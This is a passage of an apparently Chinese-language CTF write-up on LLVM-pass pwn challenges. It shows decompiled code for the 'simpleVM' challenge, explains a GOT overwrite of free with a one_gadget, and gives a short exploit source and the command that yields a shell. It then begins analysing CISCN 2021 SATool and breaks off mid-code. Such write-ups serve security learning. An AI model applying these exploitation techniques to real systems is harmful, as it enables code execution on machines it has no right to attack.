class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里我们终于可以知道为什么题目的名字叫<code>simpleVM</code>了，这就是很经典的<code>VMpwn</code>，只不过和<code>llvm pass</code>相结合而已。这个函数实现了<code>push</code>、<code>pop</code>、<code>store</code>、<code>load</code>、<code>add</code>指令功能。为了方便看懂代码，这里先简单分析几个<code>llvm pass</code>中的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>获取函数的名字并赋值给<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>获取函数的一个参数并将其赋值给<code>v8</code><br>这里我选择使用<code>add</code>、<code>store</code>、<code>load</code>相互配合来实现任意地址写，下面给出关键代码片段  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学过<code>VMpwn</code>的师傅会发现，这里可以很容易的实现任意地址写<br>我们前面<code>checksec</code>发现<code>opt-8</code>并没有开启<code>PIE</code>保护以及<code>got</code>表可写。通过分析，在该关键函数每论循环结束时都会执行<code>free</code>函数，于是我们可以选择修改”寄存器”的值为<code>got</code>表地址，然后将里面的值读进”寄存器”，然后再利用<code>add</code>函数将”寄存器”里的<code>free</code>函数改成<code>onegadget</code>，最后写回<code>free</code>的<code>got</code>表中，程序调用<code>free</code>即可执行<code>onegadget</code>。最终的<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后执行<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>即可<code>getshell</code><br>由于没有在比赛中遇到过这种题目，所以不知道远程是怎么打的。听别的师傅说，好像和<code>kernel pwn</code>和<code>qemu</code>逃逸一样，都是直接上传一个<code>elf</code>  </p><h2 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h2><p>首先还是按照上面的方法定位到被进行修改过的<code>runOnFunction</code>函数为<code>sub_19D0</code>，点开一看<code>500</code>多行代码，直接看的头大，这时候就十分的考验我们对关键代码的定位了<br>首先在最前面  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>从中我们可以看到要一定要有名为<code>B4ckDo0r</code>（小端序）的函数才可以进行后面的操作<br>后面的程序大概可以看出，根据B4ckDo0r中调用不同的函数从而来执行相应的操作，接下来进行详细的分析<br>我们可以观察到如果传入的是<code>run</code>函数，他所执行的程序中存在以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span 